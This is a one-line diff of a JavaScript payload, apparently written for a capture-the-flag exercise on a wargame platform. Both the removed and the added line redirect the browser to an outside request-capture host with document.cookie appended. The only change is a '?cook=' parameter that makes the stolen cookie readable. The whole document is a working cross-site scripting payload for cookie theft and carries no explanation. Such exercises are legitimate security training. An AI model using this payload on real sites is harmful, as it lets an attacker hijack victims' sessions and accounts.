@@ -1,1 +1,1 @@
-document.location.href="https://vqpfkuq.request.dreamhack.games"+document.cookie;
+document.location.href="https://vqpfkuq.request.dreamhack.games/?cook="+document.cookie;
